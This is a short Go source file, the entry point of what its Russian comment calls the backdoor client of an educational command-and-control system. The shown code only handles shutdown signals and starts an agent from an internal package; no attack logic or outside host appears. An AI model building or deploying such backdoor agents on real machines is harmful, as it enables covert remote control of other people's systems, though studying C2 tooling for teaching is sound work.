// Command client — клиент-бэкдор учебной C2-системы.
package main

import (
	"context"
	"errors"
	"log"
	"os/signal"
	"syscall"

	"c2project/internal/agent"
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	a := agent.New(agent.DefaultConfig())
	if err := a.Run(ctx); err != nil && !errors.Is(err, context.Canceled) {
		log.Fatalf("[CLIENT] завершён с ошибкой: %v", err)
	}
	log.Println("[CLIENT] корректно завершён")
}